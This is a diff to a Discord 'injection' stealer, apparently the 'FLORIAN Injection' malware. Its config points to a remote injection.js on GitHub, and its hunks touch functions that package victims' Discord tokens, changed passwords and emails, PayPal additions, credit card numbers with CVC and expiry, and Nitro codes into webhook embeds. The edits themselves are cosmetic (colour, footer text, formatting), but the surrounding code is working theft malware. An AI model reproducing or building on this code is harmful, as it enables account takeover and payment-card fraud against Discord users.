@@ -13,7 +13,7 @@ const config = {
   ping_val: '@everyone', 
   embed_name: 'FLORIAN Injection', 
   embed_icon: 'https://cdn.discordapp.com/avatars/544357143260692481/a_ca57386ae463ae259ef962725ffaccfd?size=512',
-  embed_color: 5639644, 
+  embed_color: 3553599, 
   injection_url: 'https://raw.githubusercontent.com/KingKrex69/Discord-Injection/main/injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
@@ -724,7 +724,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
 },
         footer: {
-          text: "@FLORIAN Injection",
+          text: "@FLORIAN/Injection",
         },
       },
     ],
@@ -766,7 +766,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
 },
         footer: {
-          text: "@FLORIAN Injection",
+          text: "@FLORIAN/Injection",
         },
       },
     ],
@@ -808,7 +808,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
 },
         footer: {
-          text: "@FLORIAN Injection",
+          text: "@FLORIAN/Injection",
         },
       },
     ],
@@ -830,17 +830,17 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Credit Card Added**',
+            name: 'Credit Card Added',
             value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
+            name: 'Discord Info',
             value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: 'Token',
             value: `\`${token}\``,
             inline: false,
           },
@@ -848,6 +848,9 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+},
+        footer: {
+          text: "@FLORIAN/Injection",
         },
       },
     ],
@@ -871,17 +874,17 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Nitro bought!**',
+            name: 'Nitro bought!',
             value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
-            name: '**Discord Info**',
+            name: 'Discord Info',
             value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: 'Token',
             value: `\`${token}\``,
             inline: false,
           },
@@ -889,6 +892,9 @@ const nitroBought = async (token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+},
+        footer: {
+          text: "@FLORIAN/Injection",
         },
       },
     ],
